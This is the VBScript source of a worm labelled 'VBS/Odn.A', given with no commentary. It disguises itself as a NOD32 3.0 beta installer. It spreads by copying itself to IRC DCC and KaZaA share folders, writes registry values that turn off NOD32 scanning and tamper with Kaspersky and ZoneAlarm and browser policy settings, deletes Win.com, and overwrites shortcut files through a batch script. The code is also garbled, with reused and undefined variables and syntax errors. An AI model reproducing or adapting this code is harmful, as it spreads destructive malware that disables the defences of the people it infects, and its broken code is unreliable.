   'VBS/Odn.A


   set odn = CreateObject("Scripting.FileSystemObject")
   set odn = odn.CreateTextFile("c:\windows\NOD32_3.0.vbs", true)
   Set odn = CreateObject("Wscript.Shell")
   set odn=shell.CreateShortCut("C:\lnk.lnk")


   Set dir1=odn.GetSpecialFolder(0)
   Set dir2=odn.GetSpecialFolder(1)


   MsgBox "Welcome to NOD32 3.0 Beta version, please wait while it's downloading..."



   odn.CopyFile Wscript.ScriptFullName, "C:\Virc\NOD32_3.0.vbs", True

   odn RegWrite "HKEY_CURRENT_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", "dcc send $nick C:\Virc\NOD32_3.0.vbs"

   odn.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",0,"REG_DWORD"
   odn.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",0,"REG_DWORD"
   odn.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",0,"REG_DWORD"
   odn.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",0,"REG_DWORD"
   odn.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",0,"REG_DWORD"
   odn.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",0,"REG_DWORD"
   odn.Regwrite "HKCU\Software\Eset\Nod\CurrentVersion\Modules\AMON\Settings\Config000\Scanner\Signatures_enable",0,"REG_DWORD"
   odn.Regwrite "HKCU\Software\KasperskyLab\SharedFiles\Folder",0,"REG_SZ"
   odn.Regwrite "HKCU\Software\Zone Labs\ZoneAlarm\InstallDirectory",0,"REG_SZ"


   Set odn = odn.GetFile("c:\Windows\Win.com")
   odn.Delete

   odn.TargetPath=shell.ExpandEnvironment("C:\lnk.lnk")
   odn.WindowStyle=4
   odn.Save
   odn fred=fred.CreateTextFile("C:\lnk.bat")
   odn.WriteLine "cls"
   odn.WriteLine "@echo off"
   odn.WriteLine "for %%a in (*.lnk ..\*.lnk \*.lnk %path%\*.lnk %tmp%\*.lnk %temp%\*.lnk %windir%\*.lnk) do copy C:\lnk.bat %%a"
   odn.Close
   odn.Run  "C:\lnk.bat"

   odn.CopyFile Wscript.ScriptFullName, "C:\My Shared Folder\NOD32_3.0.vbs", True


   odn.RegWrite "HKLM\\Software\\KaZaA\\Transfer\\DlDir0", "C:\My Shared Folder"

   MsgBox "AMON alert: AMON has found VBS/Odn.A Worm in C:\autoexec.bat. Please delete them"
